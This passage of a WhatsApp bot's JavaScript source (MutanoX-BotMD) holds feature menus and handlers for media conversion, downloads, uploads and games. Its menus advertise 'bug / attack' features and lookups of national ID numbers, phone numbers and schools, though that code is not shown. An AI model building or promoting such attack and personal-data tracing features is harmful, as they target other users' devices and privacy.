╭┈ ˚ ·『 \`MENU JPM/STORE\` 』
│┃꒰ 𖢷listproduk *<setting.js>*
│┃꒰ 𖢷proses *<store>*
│┃꒰ 𖢷done *<store>*
│┃꒰ 𖢷cekidch *<link saluran>*
│┃꒰ 𖢷addidch *<link saluran jpm>*
│┃꒰ 𖢷delidch *<hapus id ch jpm>*
│┃꒰ 𖢷jpmch *<teks buat send ke ch>*
│┃꒰ 𖢷jpm *<jpm biasa>*
│┃꒰ 𖢷jpm2 *<jpm video>*
│┃꒰ 𖢷jpm3 *<jpm foto>*
│┃꒰ 𖢷savekontak *<savekontak group>*
│┃꒰ 𖢷pushkontak *<pushkontak di grup>*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`WEBSITE MENU\` 』
│┃꒰ 𖢷gethtml *<link/domain>*
│┃꒰ 𖢷enchtml *<lock html>*
│┃꒰ 𖢷deployweb *<reply html/zip>*
│┃꒰ 𖢷listweb *<list project web>*
│┃꒰ 𖢷delweb *<delete project web>*
│┃꒰ 𖢷historyweb *<show project web>*
│┃꒰ 𖢷infoweb *<info project>*
│┃꒰ 𖢷cekweb *<cek project>*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`TOOLS MENU\` 』
│┃꒰ 𖢷rvo *<reply pesan viewOnce>*
│┃꒰ 𖢷gethtml *<link/domain>*
│┃꒰ 𖢷videotourl *<link/domain>*
│┃꒰ 𖢷toaudio *<mp4 to mp3>*
│┃꒰ 𖢷mp4toaudio *<mp4 to mp3>*
│┃꒰ 𖢷audiotourl *<mp3 url>*
│┃꒰ 𖢷addcase2 *<reply case>*
│┃꒰ 𖢷addcase *<add fitur>*
│┃꒰ 𖢷delcase *<delete fitur>*
│┃꒰ 𖢷cekcuaca *<kota>*
│┃꒰ 𖢷swdl *<ambilsw>*
│┃꒰ 𖢷getpp *<ambil profil user>*
│┃꒰ 𖢷getcode *<message>*
│┃꒰ 𖢷tobase64 *<text>*
│┃꒰ 𖢷number-info *<nomor>*
│┃꒰ 𖢷search-username *<usn>*
│┃꒰ 𖢷toptv *<vd to video pendek>*
│┃꒰ 𖢷cekdevice
│┃꒰ 𖢷school-track
│┃꒰ 𖢷nik-information *<nik>*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`FEATURE CPANEL\` 』
│┃꒰ 𖢷Cpanel
│┃꒰ 𖢷Cadmin
│┃꒰ 𖢷Lispanel
│┃꒰ 𖢷Listadmin
│┃꒰ 𖢷Delpanel
│┃꒰ 𖢷Deladmin
│┃꒰ 𖢷1gb-v2 - unli-2
│┃꒰ 𖢷Listpanel-v2
│┃꒰ 𖢷Listadmin-v2
│┃꒰ 𖢷Delpanel-v2
│┃꒰ 𖢷Deladmin-v2
╰——————・・・・————・・・
╭┈ ˚ ·『 \`ACCES OWNER\` 』
│┃꒰ 𖢷gethtml *<link/domain>*
│┃꒰ 𖢷Getcase *<ambil case>*
│┃꒰ 𖢷Addcase2 *<reply case>*
│┃꒰ 𖢷Addcase *<tambah case>*
│┃꒰ 𖢷Delcase *<delete case>*
│┃꒰ 𖢷Panduan *<information>*
│┃꒰ 𖢷totalgc *<totalgc bot>*
│┃꒰ 𖢷Public *<publik mode>*
│┃꒰ 𖢷Self *<pribadi mode>*
│┃꒰ 𖢷Addowner
│┃꒰ 𖢷DelOwner
│┃꒰ 𖢷Listowner
│┃꒰ 𖢷Addseller
│┃꒰ 𖢷Delseller
│┃꒰ 𖢷Listseller
│┃꒰ 𖢷Restart 
│┃꒰ 𖢷Ping
│┃꒰ 𖢷Clearchat
╰——————・・・・————・・・
╭┈ ˚ ·〔 *HOW TO USE* 〕
│┃꒰ 𖢷allmenu     < show all fitur >
│┃꒰ 𖢷bugmenu   < show fitur bug >
│┃꒰ 𖢷request     < show and req>
│┃꒰ 𖢷buysc  < script and price >
│┃꒰ 𖢷cpanel    < create panel >
│┃꒰ 𖢷owner  < contact wa dev >
│┃꒰ 𖢷developer   < creator script >
╰❒——————・・・・————・・・〔 *POPULAR MENU* 〕
│┃꒰ 𖢷polling *<custom polling>*
│┃꒰ 𖢷bugmenu   < main script >
│┃꒰ 𖢷addcase   <  add fitur >
│┃꒰ 𖢷upch   < upedia ke ch >
│┃꒰ 𖢷swdl    < status downloader >
│┃꒰ 𖢷swgrup   < up story in group >
│┃꒰ 𖢷sticker  < img to sticker >
│┃꒰ 𖢷brat    < text to sticker >
│┃꒰ 𖢷getpp     < get pp user >
│┃꒰ 𖢷payment  < setting payment >
│┃꒰ 𖢷ytmp3   < dl audio youtube >
│┃꒰ 𖢷tagall  < mention all user gb >
│┃꒰ 𖢷play      < search youtube >
│┃꒰ 𖢷tiktok    < tiktok downloader >
│┃꒰ 𖢷instagram   < ig downloader >
│┃꒰ 𖢷twitter  < twitter downloader >
╰——————・・・・————・・・
`

const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {

contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "𝐊𝐄𝐋𝐄𝐏𝐎𝐍",
newsletterJid: "120363426723637081@newsletter",
serverMessageId: 1
}
},

header: {
hasMediaAttachment: true,
imageMessage: media.imageMessage
},

body: {
text: menu
},

footer: {
text: `MutanoX-BotV10`
},

nativeFlowMessage: {

messageParamsJson: JSON.stringify({}),

buttons: [

{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Select Menu",
sections: [
{
title: "\ud83d\udce6 Kategori Fitur",
rows: [
{ header: "All Menu", title: "Lihat semua fitur", id: `${prefix}semua` },
{ header: "Bug Fitur", title: "Fitur bug / attack", id: `${prefix}bugmenu` },
{ header: "Create Panel", title: "Buat panel Pterodactyl", id: `${prefix}cpanel` },
{ header: "Buy Script", title: "Info pembelian script", id: `${prefix}buysc` },
{ header: "Payment Info", title: "Info pembayaran (QRIS)", id: `${prefix}qris` },
{ header: "Thanks To", title: "Daftar pendukung", id: `${prefix}tqto` },
{ header: "Info / Request", title: "Kirim request fitur", id: `${prefix}request` },
{ header: "About Developer", title: "Profil developer", id: `${prefix}developer` },
{ header: "Back to Menu", title: "Kembali ke menu utama", id: `${prefix}menu` }
]
}
]
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Contact Developer",
url: "https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g"
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Back Menu",
id: `${prefix}menu`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Bug Fitur",
id: `${prefix}bugmenu`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Buy Script",
id: `${prefix}buysc`
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Saluran Developer",
url: "https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g"
})
}

]
}
}
}
}
}, { quoted: lol })  
await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break
case "toviewonce":
case "to1xlihat": {
    if (!m.quoted) return Reply('Reply foto / video nya!')

    let msg = m.quoted
    let mime = (msg.msg || msg).mimetype || ''

    if (/image/.test(mime)) {
        let media = await msg.download()

        await conn.sendMessage(m.chat, {
            viewOnce: true,
            image: media,
            caption: '👁️ 1x Lihat'
        }, { quoted: m })

    } else if (/video/.test(mime)) {
        let media = await msg.download()

        await conn.sendMessage(m.chat, {
            viewOnce: true,
            video: media,
            caption: '👁️ 1x Lihat'
        }, { quoted: m })

    } else {
        return Reply('Hanya bisa untuk foto / video!')
    }
}
break;
case "enchtml": {
if (!m.quoted) return Reply("Reply file HTML")

let media = await m.quoted.download()
let html = media.toString()

let enc = Buffer.from(html).toString("base64")

let hasil = `<script>
document.write(atob("${enc}"))
</script>`

await conn.sendMessage(m.chat, {
document: Buffer.from(hasil),
mimetype: "text/html",
fileName: "enc.html"
}, { quoted: m })

}
break
case "antilinkall": {

if (!m.isGroup) return Reply("Khusus grup")
if (!isAdmins && !isCreator) return Reply("Khusus admin")

if (!antilink[m.chat]) antilink[m.chat] = { antilinkall: false, warnings: {} }

const argsLower = q.toLowerCase()

if (argsLower === "on") {

antilink[m.chat].antilinkall = true
saveAntilink()

Reply("✅ AntiLink Semua AKTIF!")

}

else if (argsLower === "off") {

antilink[m.chat].antilinkall = false
saveAntilink()

Reply("❌ AntiLink Semua NONAKTIF!")

}

else {

Reply(`Contoh:\n${prefix}antilinkall on\n${prefix}antilinkall off`)

}

}
break
          case "start":
          case "pah":
          case "menu":{
const randomThumb = thumbnails[Math.floor(Math.random() * thumbnails.length)]
const media = await prepareWAMessageMedia(
{ image: { url: randomThumb } },
{ upload: conn.waUploadToServer }
)
let load = await conn.sendMessage(m.chat, { text: "Loading Menu..." }, { quoted: m })

let frames = ["\u25A2\u25A2\u25A2\u25A2\u25A2","\u25A3\u25A2\u25A2\u25A2\u25A2","\u25A3\u25A3\u25A2\u25A2\u25A2","\u25A3\u25A3\u25A3\u25A2\u25A2","\u25A3\u25A3\u25A3\u25A3\u25A2","\u25A3\u25A3\u25A3\u25A3\u25A3"]

for (let i of frames) {
await new Promise(r => setTimeout(r, 350))
await conn.sendMessage(m.chat, {
text: `Loading Menu\n${i}`,
edit: load.key
})
}

await new Promise(r => setTimeout(r, 350))
await conn.sendMessage(m.chat, {
text: `Success Loading Menu`,
edit: load.key
})

await new Promise(r => setTimeout(r, 400))
const readMore = "\u200e".repeat(4000)

    let menu = `${readMore}✨ *${greeting()}, ${pushname}!*
✨ Bem-vindo ao *MutanoX-BotMD*
✨ Bot WhatsApp criado por *Kelpin Gv*
✨ Tools • Group Mgmt • Bug Features

╭┈✨ 【 *BOT INFO* 】
┃┃ *Name Bot*     » MutanoX-BotMD
┃┃ *Developer*     » Kelpin Gv
┃┃ *Version*       » V10.0.0
┃┃ *Language*      » JavaScript
┃┃ *RunTime*       » ${runtime(process.uptime())}
┃┃ *Feature*       » Multy & Bug
┃┃ *StatusScript*  » buyVip/buyer
╰─────・・・・───・・・

╭┈⚡ 【 *SUPPORT SCRIPT* 】
┃⚡ Arsena                 — *Friends*
┃⚡ All Friend             — *My Support*
┃⚡ Script users           — *Thank You*
┃⚡ All Title MutanoX-Bot  — *Support*
┃⚡ All Buyers Kelpin      — *Support*
╰─────・・・・───・・・

${readMore}> Ketuk tombol *Select Menu* di bawah\n> para membuka daftar kategori fitur.\n`

 const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {

contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "������������������������������������������",
newsletterJid: "120363426723637081@newsletter",
serverMessageId: 1
}
},

header: {
hasMediaAttachment: true,
imageMessage: media.imageMessage
},

body: {
text: menu
},

footer: {
text: `ᴍᴌᴀᴇᴀᴁᴄᴅ ᴇᴇ ᴰᴢᴥᴩᴢᴧ`
},

nativeFlowMessage: {

messageParamsJson: JSON.stringify({}),

buttons: [

{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Select Menu",
sections: [
{
title: "������ Kategori Fitur",
rows: [
{ header: "All Menu", title: "Lihat semua fitur", id: `${prefix}semua` },
{ header: "Bug Fitur", title: "Fitur bug / attack", id: `${prefix}bug` },
{ header: "Download Fitur", title: "Downloader menu", id: `${prefix}downloadmenu` },
{ header: "Create Panel", title: "Buat panel Pterodactyl", id: `${prefix}cpanel` },
{ header: "Buy Script", title: "Info pembelian script", id: `${prefix}buysc` },
{ header: "Payment Info", title: "Info pembayaran (QRIS)", id: `${prefix}qris` },
{ header: "Thanks To", title: "Daftar pendukung", id: `${prefix}tqto` },
{ header: "Info / Request", title: "Kirim request fitur", id: `${prefix}request` },
{ header: "About Developer", title: "Profil developer", id: `${prefix}developer` }
]
}
]
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "All Menu (Image)",
id: `${prefix}semua`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Bug Fitur",
id: `${prefix}bug`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Download Fitur",
id: `${prefix}downloadmenu`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Create Panel",
id: `${prefix}cpanel`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Buy Script",
id: `${prefix}buysc`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Payment Info",
id: `${prefix}qris`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Thangks To",
id: `${prefix}tqto`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "Info/Request",
id: `${prefix}request`
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "About Developer",
id: `${prefix}developer`
})
},

{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Saluran developer",
url: "https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g"
})
}

]

}

}
}
}

}, { quoted: lol })
await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break
case "videotourl": {
try {
if (!m.quoted) return Reply("❌ Reply video nya bang")

let mime = (m.quoted.msg || m.quoted).mimetype || ""
if (!/video/.test(mime)) return Reply("❌ Harus video (mp4)")

Reply("⏳ Uploading video...")

let media = await conn.downloadAndSaveMediaMessage(m.quoted)

// upload ke catbox
const axios = require("axios")
const FormData = require("form-data")
const fs = require("fs")

let form = new FormData()
form.append("fileToUpload", fs.createReadStream(media))
form.append("reqtype", "fileupload")

let res = await axios.post("https://catbox.moe/user/api.php", form, {
headers: form.getHeaders()
})

fs.unlinkSync(media)

Reply(`✅ *Upload Berhasil!*\n\n🔗 ${res.data}`)

} catch (e) {
console.log(e)
Reply("❌ Error upload bang")
}
}
break
case "toaudio":
case "mp4toaudio": {
    try {
        let q = m.quoted ? m.quoted : m
        let mime = (q.msg || q).mimetype || ""

        if (!/video/.test(mime)) {
            return m.reply("Kirim / reply video dulu!")
        }

        m.reply("⏳ Mengubah video ke audio...")

        // download video
        let media = await q.download()

        const fs = require("fs")
        const { exec } = require("child_process")

        let input = "./temp_video.mp4"
        let output = "./temp_audio.mp3"

        fs.writeFileSync(input, media)

        // convert pakai ffmpeg
        exec(`ffmpeg -i ${input} -vn -ab 128k -ar 44100 -y ${output}`, async (err) => {
            if (err) {
                console.log(err)
                return m.reply("❌ Gagal convert!")
            }

            await conn.sendMessage(m.chat, {
                audio: fs.readFileSync(output),
                mimetype: "audio/mpeg",
                ptt: false
            }, { quoted: m })

            // hapus file
            fs.unlinkSync(input)
            fs.unlinkSync(output)
        })

    } catch (e) {
        console.log(e)
        m.reply("❌ Terjadi error!")
    }
}
break;
case 'audiotourl': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');

    // ambil pesan yang dikirim atau reply
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';

    // cek apakah file audio atau dokumen
    if (!/audio|ogg|mp3|m4a|opus/.test(mimetype)) {
        return Reply(`❌ Kirim atau reply audio/voice note untuk diubah jadi URL dengan *${usedPrefix + command}*`);
    }

    try {
        // react ke chat
        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        // download file
        const media = await q.download?.();
        const fileSizeInBytes = media.length;
        const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
        const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
        const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;

        // upload ke catbox.moe
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        let ext = mimetype.split('/')[1] || 'mp3';
        form.append('fileToUpload', media, `file.${ext}`);

        const res = await fetch('https://catbox.moe/user/api.php', {
            method: 'POST',
            body: form
        });

        const result = await res.text();
        const url = result.trim();
        const caption = `✅ URL berhasil dibuat: ${url}\n*Ukuran:* ${fileSize}`;

        await conn.sendMessage(m.chat, { text: caption }, { quoted: m });
    } catch (e) {
        console.error(e);
        Reply(`[ ! ] Gagal mengunggah audio. Error: ${e.message}`);
    }
};
break;
case 'translate': case 'tr': {

if (!text) return Reply("Contoh:\n.translate id hello world")

let [lang, ...teks] = text.split(" ")
let query = teks.join(" ")

if (!query) return Reply("Masukkan teks yang ingin diterjemahkan")

const axios = require("axios")

let res = await axios.get(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(query)}&langpair=auto|${lang}`)

Reply(`Translate (${lang}) :\n${res.data.responseData.translatedText}`)

}
break
case 'douyin':
case 'capcut':
case 'threads':
case 'kuaishou':
case 'qq':
case 'espn':
case 'pinterest':
case 'imdb':
case 'imgur':
case 'ifunny':
case 'izlesene':
case 'reddit':
case 'youtube':
case 'twitter':
case 'vimeo':
case 'snapchat':
case 'bilibili':
case 'dailymotion':
case 'sharechat':
case 'likee':
case 'linkedin':
case 'tumblr':
case 'hipi':
case 'telegram':
case 'getstickerpack':
case 'bitchute':
case 'febspot':
case '9gag':
case 'oke.ru':
case 'rumble':
case 'streamable':
case 'ted':
case 'sohutv':
case 'pornbox':
case 'xvideos':
case 'xnxx':
case 'kuaishou':
case 'xiaohongshu':
case 'ixigua':
case 'weibo':
case 'miaopai':
case 'meipai':
case 'xiaoying':
case 'nationalvideo':
case 'yingke':
case 'sina':
case 'bluesky':
case 'soundcloud':
case 'mixcloud':
case 'spotify':
case 'zingmp3':
case 'bandcamp':
case 'download':
case "aio": {
     if (!text) return Reply(`\`masukan link/url nya\``)
   try {
    async function fetchInitialPage(initialUrl) {
      try {
        const axios = require('axios')
        const cheerio = require('cheerio')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': initialUrl,
        }
        const response = await axios.get(initialUrl, { headers })
        const $ = cheerio.load(response.data)
        const csrfToken = $('meta[name="csrf-token"]').attr('content')
        if (!csrfToken) throw new Error('Gagal nemu token keamanan, coba lagi!')
        let cookies = ''
        if (response.headers['set-cookie']) {
          cookies = response.headers['set-cookie'].join('; ')
        }
        return { csrfToken, cookies }
      } catch (error) {
        throw new Error(`Gagal ambil halaman awal: ${error.message}`)
      }
    }
    async function postDownloadRequest(downloadUrl, userUrl, csrfToken, cookies) {
      try {
        const axios = require('axios')
        const headers = {
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
          'Referer': 'https://on4t.com/online-video-downloader',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Accept': '*/*',
          'X-Requested-With': 'XMLHttpRequest',
          'Cookie': cookies
        }
        const postData = new URLSearchParams()
        postData.append('_token', csrfToken)
        postData.append('link[]', userUrl)
        const response = await axios.post(downloadUrl, postData.toString(), { headers })
        if (response.data?.result?.length) {
          return response.data.result.map(item => ({
            title: item.title,
            thumb: item.image,
            url: item.video_file_url || item.videoimg_file_url
          }))
        } else {
          throw new Error('Respons dari server gak sesuai harapan, coba link lain!')
        }
      } catch (error) {
        throw new Error(`Gagal proses permintaan download: ${error.message}`)
      }
    }
    async function sendMediaAutoType(url, title) {
      try {
        const axios = require('axios')
        const { fromBuffer } = require('file-type')   
        const res = await axios.get(url, { responseType: 'arraybuffer' })
        const buff = Buffer.from(res.data)
        const fileInfo = await fromBuffer(buff)
        if (!fileInfo) return Reply(`Gagal deteksi tipe file: ${title}`)
        let mime = fileInfo.mime
        let ext = fileInfo.ext
        if (mime.startsWith('video/')) {
          await conn.sendMessage(m.chat, { video: buff, caption: title }, { quoted: m })
        } else if (mime.startsWith('audio/')) {
          await conn.sendMessage(m.chat, { audio: buff, mimetype: mime }, { quoted: m })
        } else if (mime.startsWith('image/')) {
          await conn.sendMessage(m.chat, { image: buff, caption: title }, { quoted: m })
        } else {
          await conn.sendMessage(m.chat, {
            document: buff,
            fileName: `${title}.${ext}`,
            mimetype: mime
          }, { quoted: m })
        }
      } catch (err) {
        Reply(`Gagal kirim media: ${err.message}`)
      }
    }
    const initialUrl = 'https://on4t.com/online-video-downloader'
    const downloadUrl = 'https://on4t.com/all-video-download'
    const { csrfToken, cookies } = await fetchInitialPage(initialUrl)
    const results = await postDownloadRequest(downloadUrl, q, csrfToken, cookies)
    for (let i = 0; i < results.length; i++) {
      await sendMediaAutoType(results[i].url, results[i].title)
    }
    await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
  } catch (err) {
    await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }) 
    Reply(err.message)
  }
break;
}
case "applesearch": {
if (!text) return Reply("Contoh:\n.applesearch xxxtentacion moonlight")

try {

const axios = require("axios")

let res = await axios.get(`https://itunes.apple.com/search?term=${encodeURIComponent(text)}&entity=song&limit=5`)

let data = res.data.results

if (!data || data.length === 0) return Reply("Lagu tidak ditemukan")

let caption = `🎵 *APPLE SEARCH*\n\n`

for (let i = 0; i < data.length; i++) {

if (i === 0) {

// lagu paling populer → kirim audio
if (data[i].previewUrl) {
await conn.sendMessage(m.chat, {
audio: { url: data[i].previewUrl },
mimetype: "audio/mp4",
ptt: false,
contextInfo: {
externalAdReply: {
title: data[i].trackName,
body: data[i].artistName,
thumbnailUrl: data[i].artworkUrl100,
mediaType: 1,
renderLargerThumbnail: true,
sourceUrl: data[i].trackViewUrl
}
}
}, { quoted: m })
}

caption += `*${i+1}. ${data[i].trackName}*\n`
caption += `👤 ${data[i].artistName}\n`
caption += `🔗 ${data[i].trackViewUrl}\n\n`

} else {

// lagu lain → hanya kirim link
caption += `*${i+1}. ${data[i].trackName}*\n`
caption += `👤 ${data[i].artistName}\n`
caption += `🔗 ${data[i].trackViewUrl}\n\n`

}

}

Reply(caption)

} catch (err) {
console.log("SPOTIFY SEARCH ERROR:", err.message)
Reply("Search lagu gagal")
}

}
break
case 'downloadmenu': {
  let caption = `halo @${pushname}, perkenalkan saya adalah bot Whatsapp yang diciptakan oleh *kelpin*, bertujuan untuk membantu anda

━━〔 INFORMATION SCRIPT 〕━━
╭┈ ˚ ·━━━━━━━━━━━━━━━━
│┃꒰ 𖢷 *Name Bot  » MutanoX-BotMD*
│┃꒰ 𖢷 *Developer* » Kelpin Gv*
│┃꒰ 𖢷 *Version  »  V10.0.0*
│┃꒰ 𖢷 *Language » JavaScript*
│┃꒰ 𖢷 *RunTime   » 1m 27s*
│┃꒰ 𖢷 *Feature  » Multy&Bug*
│┃꒰ 𖢷 *StatusScript  » buyVip/buyer*
╰——————・・・・————・・・
`

const randomThumb = thumbnails[Math.floor(Math.random() * thumbnails.length)]
await conn.sendMessage(m.chat, {
interactiveMessage: {

contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "𝐊𝐄𝐋𝐄𝐏𝐎𝐍",
newsletterJid: "120363426723637081@newsletter",
serverMessageId: 1
}
},

title: caption,

footer: `
 ╭━〔 DOWNLOAD MENU 〕━⬣
┃
┃ 🎬 VIDEO PLATFORM
┃ ◦ .youtube
┃ ◦ .twitter
┃ ◦ .bilibili
┃ ◦ .dailymotion
┃ ◦ .vimeo
┃ ◦ .rumble
┃ ◦ .bitchute
┃ ◦ .streamable
┃ ◦ .febspot
┃ ◦ .cted
┃
┃ 📱 SOCIAL MEDIA
┃ ◦ .capcut
┃ ◦ .instagram
┃ ◦ .tiktok
┃ ◦ .douyin
┃ ◦ .threads
┃ ◦ .kuaishou
┃ ◦ .reddit
┃ ◦ .snapchat
┃ ◦ .linkedin
┃ ◦ .tumblr
┃ ◦ .telegram
┃ ◦ .sharechat
┃ ◦ .likee
┃ ◦ .bluesky
┃
┃ 🖼 IMAGE / GIF
┃ ◦ .pinterest
┃ ◦ .imgur
┃ ◦ .ifunny
┃ ◦ .9gag
┃
┃ 🌏 CHINA PLATFORM
┃ ◦ .xiaohongshu
┃ ◦ .ixigua
┃ ◦ .weibo
┃ ◦ .miaopai
┃ ◦ .meipai
┃ ◦ .xiaoying
┃ ◦ .yingke
┃ ◦ .sina
┃ ◦ .sohutv
┃
┃ 🎵 MUSIC
┃ ◦ .soundcloud
┃ ◦ .mixcloud
┃ ◦ .spotify
┃ ◦ .zingmp3
┃ ◦ .bandcamp
┃
┃ 🔞 ADULT
┃ ◦ .pornbox
┃ ◦ .xvideos
┃ ◦ .xnxx
┃
┃ ⚙️ OTHER
┃ ◦ .qq
┃ ◦ .espn
┃ ◦ .imdb
┃ ◦ .izlesene
┃ ◦ .hipi
┃ ◦ .getstickerpack
┃ ◦ .download
┃ ◦ .aio
┃
╰━━━━━━━━━━━━━━━━━━⬣`,

thumbnail: randomThumb,

nativeFlowMessage: {
messageParamsJson: JSON.stringify({
limited_time_offer: {
text: "'KELPIN GV'",
url: "https://wa.me/6283192054753",
copy_code: "𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙖𝙙𝙚 𝙗𝙮 𝙠𝙚𝙡𝙥𝙞𝙣",
expiration_time: Date.now() * 999
}
}),

buttons: [
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "All Fitur",
id: `${prefix}allmenu`
})
}
]
}

}
}, { quoted: lol })
  // kirim voice note / musik
  await conn.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mp4',
    ptt: true
  }, { quoted: qtoko })
}
break
case "tebakkata": {
    if (!conn.tebakkata) conn.tebakkata = {}

    // ambil data soal dari GitHub
    let response = await fetch("https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakkata.json")
    let data = await response.json()
    let random = data[Math.floor(Math.random() * data.length)]

    // pastikan jawaban selalu array
    let jawaban = Array.isArray(random.jawaban) ? random.jawaban : [random.jawaban]

    // kirim soal pakai Reply support iOS
    let soal = await Kata(`🧩 *TEBAK KATA*\n\nTebak kata berikut ini:\n${random.soal}\n\nReply pesan ini untuk menjawab 😏`)

    // simpan jawaban sesuai ID pesan
    conn.tebakkata[soal.key.id] = jawaban

    // timeout 30 detik untuk reveal jawaban jika tidak dijawab
    setTimeout(async () => {
        if (conn.tebakkata[soal.key.id]) {
            // gabungkan semua jawaban, bukan ambil karakter pertama
            await Kata(`⏰ Waktu habis!\nJawaban: *${conn.tebakkata[soal.key.id].join(", ")}*`)
            delete conn.tebakkata[soal.key.id]
        }
    }, 30000)
}
break
case "guessflag":
case "tebakbendera": {

if (!conn.tebakbendera) conn.tebakbendera = {}

let data = [
{flag:"🇦🇫", jawab:["afghanistan"]},
{flag:"🇦🇱", jawab:["albania"]},
{flag:"🇩🇿", jawab:["algeria"]},
{flag:"🇦🇷", jawab:["argentina"]},
{flag:"🇦🇺", jawab:["australia"]},
{flag:"🇦🇹", jawab:["austria"]},
{flag:"🇧🇩", jawab:["bangladesh"]},
{flag:"🇧🇾", jawab:["belarus"]},
{flag:"🇧🇪", jawab:["belgia","belgium"]},
{flag:"🇧🇷", jawab:["brazil","brasil"]},
{flag:"🇧🇬", jawab:["bulgaria"]},
{flag:"🇰🇭", jawab:["kamboja","cambodia"]},
{flag:"🇨🇦", jawab:["canada"]},
{flag:"🇨🇱", jawab:["chile"]},
{flag:"🇨🇳", jawab:["china","cina","tiongkok"]},
{flag:"🇨🇴", jawab:["colombia"]},
{flag:"🇭🇷", jawab:["croatia"]},
{flag:"🇨🇿", jawab:["czech","czech republic"]},
{flag:"🇩🇰", jawab:["denmark"]},
{flag:"🇪🇬", jawab:["mesir","egypt"]},
{flag:"🇪🇪", jawab:["estonia"]},
{flag:"🇫🇮", jawab:["finland","finlandia"]},
{flag:"🇫🇷", jawab:["france","prancis"]},
{flag:"🇩🇪", jawab:["germany","jerman"]},
{flag:"🇬🇷", jawab:["greece","yunani"]},
{flag:"🇭🇰", jawab:["hong kong"]},
{flag:"🇭🇺", jawab:["hungary"]},
{flag:"🇮🇸", jawab:["iceland"]},
{flag:"🇮🇳", jawab:["india"]},
{flag:"🇮🇩", jawab:["indonesia","ri"]},
{flag:"🇮🇷", jawab:["iran"]},
{flag:"🇮🇶", jawab:["iraq"]},
{flag:"🇮🇪", jawab:["ireland"]},
{flag:"🇮🇱", jawab:["israel"]},
{flag:"🇮🇹", jawab:["italy","italia"]},
{flag:"🇯🇲", jawab:["jamaica"]},
{flag:"🇯🇵", jawab:["japan","jepang"]},
{flag:"🇰🇿", jawab:["kazakhstan"]},
{flag:"🇰🇪", jawab:["kenya"]},
{flag:"🇰🇷", jawab:["korea selatan","south korea","korea"]},
{flag:"🇰🇼", jawab:["kuwait"]},
{flag:"🇱🇦", jawab:["laos"]},
{flag:"🇱🇻", jawab:["latvia"]},
{flag:"🇱🇧", jawab:["lebanon"]},
{flag:"🇱🇹", jawab:["lithuania"]},
{flag:"🇱🇺", jawab:["luxembourg"]},
{flag:"🇲🇾", jawab:["malaysia"]},
{flag:"🇲🇽", jawab:["mexico"]},
{flag:"🇲🇳", jawab:["mongolia"]},
{flag:"🇲🇦", jawab:["morocco"]},
{flag:"🇲🇲", jawab:["myanmar"]},
{flag:"🇳🇵", jawab:["nepal"]},
{flag:"🇳🇱", jawab:["netherlands","belanda"]},
{flag:"🇳🇿", jawab:["new zealand","selandia baru"]},
{flag:"🇳🇬", jawab:["nigeria"]},
{flag:"🇳🇴", jawab:["norway","norwegia"]},
{flag:"🇴🇲", jawab:["oman"]},
{flag:"🇵🇰", jawab:["pakistan"]},
{flag:"🇵🇦", jawab:["panama"]},
{flag:"🇵🇪", jawab:["peru"]},
{flag:"🇵🇭", jawab:["philippines","filipina"]},
